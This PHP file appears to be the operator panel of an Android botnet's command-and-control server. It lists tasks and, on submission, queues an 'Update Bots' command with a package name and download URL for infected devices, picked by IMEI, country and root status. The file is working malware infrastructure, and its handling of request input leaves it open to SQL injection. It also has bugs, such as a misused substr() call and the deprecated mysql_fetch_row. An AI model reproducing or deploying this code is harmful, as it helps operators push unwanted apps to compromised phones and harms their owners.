<?php session_start();
include '../db.php';
include 'func.php';
if (!(isset($_SESSION['user_id']))) 
{
header("Location: ../index.php");  

}  

# variables
$html = '';
$html_table1 = '';
$html_table2 = '';


$query = "SELECT * FROM `task` WHERE `active` = 1";    
$result = $mysqli->query($query);


// формируем запрос
$first = $p*$users_on_page-$users_on_page;
$query2 = "select * from `task`  WHERE `active` = 1 limit 1";
$result2 = $mysqli->query($query2);


while($row = mysqli_fetch_assoc($result2)) // цикл вывода

{
    if ($row['country'] == ""){$country = 'Any';}
    else {$country = $row['country'];}
    
    if ($row['osver'] == ""){$osver = 'Any';}
    else {$osver = $row['osver'];}
    
    if ($row['model'] == ""){$model = 'Any';}
    else {$model = $row['model'];}
    
    if ($row['root'] == 1){$root = 'Yes';}
    if ($row['root'] == 2){$root = 'No';}
    if ($row['root'] == ""){$root = 'All';}
    else {$root = $row['root'];}
    
      $html_table1 .= '<tr>
                 
                 <td>' . $row['number'] . '</td>
                 <td>' . $row['package'] . '</td>
                 <td class="country">' . $country . '</td>
                 <td>' . $row['lim'] . '</td>
                 <td> 
                    <button onclick="remove_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
                    <i class="material-icons">close</i>
                    </button> 
                </td>
                 <td> 
                    <button onclick="stat_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
                    <i class="material-icons">show_chart</i>
                    </button> 
                </td>
                <td> 
                    <button onclick="edit_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
                    <i class="material-icons">create</i>
                    </button> 
                </td>
             </tr>';
}

$query = "SELECT * FROM `task` WHERE `active` = 2";    
$result = $mysqli->query($query);


// формируем запрос
$first = $p*$users_on_page-$users_on_page;
$query2 = "select * from `task`  WHERE 1";
$result2 = $mysqli->query($query2);
$all_tasks_count = $result2->num_rows;


while($row = mysqli_fetch_assoc($result2)) // цикл вывода
{
    if ($row['country'] == ""){$country = 'Any';}
    else {$country = $row['country'];}
    
    if ($row['osver'] == ""){$osver = 'Any';}
    else {$osver = $row['osver'];}
    
    if ($row['model'] == ""){$model = 'Any';}
    else {$model = $row['model'];}
    
    if ($row['root'] == 1){$root = 'Yes';}
    if ($row['root'] == 2){$root = 'No';}
    if ($row['root'] == ""){$root = 'All';}
    else {$root = $row['root'];}
    $task_id = $row['id'];
    $task_progress = getTaskProgress($task_id, $mysqli);
      $html_table2 .= '<tr>
                 
                 <td>' . $row['id'] . '</td>
                 <td>' . $row['package'] . '</td>
                 <td style="max-width: 150px;white-space: nowrap;overflow: hidden;    text-overflow: ellipsis;">' . $row['url'] . '</td>
                 <td style="max-width: 150px;white-space: nowrap;overflow: hidden;    text-overflow: ellipsis;" class="country">' . $country . '</td>
                 <td>' . $row['lim'] . '</td>
                 <td>' . $task_progress . '</td>
                  
                <td> 
                    <button onclick="del_Task('.$row['id'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
                    <i class="material-icons">delete</i>
                    </button> 
                </td>
             </tr>';

}

$html = file_get_contents("templates/tasks.tpl");
$html = str_replace('%%PLACE_YOU_TABLE_HERE%%', $html_table1, $html);
$html = str_replace('%%PLACE_YOU_TABLE2_HERE%%', $html_table2, $html);

echo $html;

?>


<?php
if (isset($_POST['command'])){
    #include '../db.php';
    $task_package = $mysqli->real_escape_string($_POST['task_package']);
    $task_country = $mysqli->real_escape_string(htmlspecialchars($_POST['task_country']));# COUNTRY (XX - country (,) )
    $task_url = $mysqli->real_escape_string($_POST['task_url']);
    $task_lim = $mysqli->real_escape_string($_POST['task_lim']);
    #$mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);
    # get all IMEI's from DB
    $country_sql = '';
    $limit_sql = '';
    $get_tasks_sql = "SELECT max(id) FROM `task` WHERE 1";
    $get_tasks_res = $mysqli->query($get_tasks_sql);
    $row = mysql_fetch_row($get_tasks_res);
    $tasks_count = intval($row[0])+1;
    #echo "$row[0]";

    if ($task_country){
        if (substr($task_country, ",")){
            $countrys = explode(",", $task_country);
            $country_sql .= "WHERE ";
            foreach ($countrys as $country) {
                $country_sql .= "`country` = '$country',";
            }
            $country_sql = rtrim($country_sql, ",");
        } else {
            $country_sql = "WHERE `country` = '$task_country'";
        }
    } else { $country_sql .= "WHERE 1"; };
    if ($task_lim){
        $limit_sql .= "LIMIT $task_lim";
    }

    $get_all_imei_sql = "SELECT id, IMEI FROM `kliets` $country_sql $limit_sql";
    $all_imei_res =  $mysqli->query($get_all_imei_sql);
    $imei_count = $all_imei_res->num_rows;
    echo $imei_count;

    $task_complete_percent = $imei_count/($task_lim*0.01);
    $task_complete = "$imei_count/$task_lim ($task_complete_percent %)";
    while ($row = mysqli_fetch_assoc($all_imei_res)) {
        #echo $row;
        $imei = $row["IMEI"];
        if($imei !="" ){
            $command_ = "|command=Update Bots|number=$task_package|text=$task_url::";
            #echo $command_;
            $add_db_commands = $mysqli->query("insert into commands (id, IMEI,command) value ('$tasks_count', '$imei','$command_')");
        }
    }
    $add_task_sql = "INSERT INTO task (url, package, country, lim, real_count, active, complete) VALUE ('$task_url', '$task_package', '$task_country','$task_lim', $imei_count,'$task_active','$task_complete')";
    $add_task_res =  $mysqli->query($add_task_sql);
    echo $add_task_sql;
    echo $add_task_res;
}

?>
